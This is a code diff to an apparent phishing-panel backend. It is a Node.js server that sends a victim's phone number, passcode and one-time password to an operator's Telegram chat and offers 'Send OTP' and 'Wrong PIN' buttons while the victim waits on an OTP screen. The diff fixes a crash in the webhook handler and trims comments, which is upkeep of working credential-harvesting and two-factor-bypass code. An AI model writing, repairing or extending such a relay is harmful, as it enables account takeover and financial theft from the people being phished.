@@ -106,21 +106,19 @@ app.post('/notify', async (req, res) => {
     let text, keyboard;
 
     if (type === 'login') {
-      // ── LOGIN ALERT — permanent message with Send OTP / Wrong PIN ──
       text = `🔔 *New Login Alert*\n\n`
            + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
            + (passcode ? `🔒 *Passcode:* \`${escMd(passcode)}\`\n` : '')
            + `\nUser is waiting on the OTP screen\\.`;
 
       keyboard = [[
-        { text: '✅ Send OTP',  callback_data: cbData('send_otp')   },
-        { text: '❌ Wrong PIN', callback_data: cbData('wrong_pin')  },
+        { text: '✅ Send OTP',  callback_data: cbData('send_otp')  },
+        { text: '❌ Wrong PIN', callback_data: cbData('wrong_pin') },
       ]];
 
     } else if (type === 'otp') {
       if (!otp) return res.status(400).json({ ok: false, error: 'Missing OTP' });
 
-      // ── OTP ALERT — permanent message with Continue / Wrong Code ──
       text = `🔐 *OTP Submitted*\n\n`
            + `📱 *Phone:* \`${escMd(fullPhone)}\`\n`
            + `🔑 *OTP:* \`${escMd(otp)}\`\n`
@@ -173,8 +171,6 @@ app.post('/poll', (req, res) => {
 // ════════════════════════════════════════════════════════
 //  POST /webhook
 //  Telegram calls this when the admin clicks a button.
-//  Messages are kept permanent — we send a new follow-up
-//  message instead of editing/deleting the original.
 // ════════════════════════════════════════════════════════
 app.post('/webhook', async (req, res) => {
   res.json({ ok: true });
@@ -186,6 +182,7 @@ app.post('/webhook', async (req, res) => {
   const cbId   = cb.id;
   const data   = cb.data || '';
   const chatId = cb.message?.chat?.id?.toString();
+  const msgId  = cb.message?.message_id;  // ← was missing, caused the crash
 
   // ── Only our admin can use these buttons ──
   if (chatId !== config.adminChatId.toString()) {
@@ -218,7 +215,7 @@ app.post('/webhook', async (req, res) => {
     return;
   }
 
-  // ── Handle the action — send follow-up message, keep original intact ──
+  // ── Handle the action ──
   try {
     switch (action) {
 
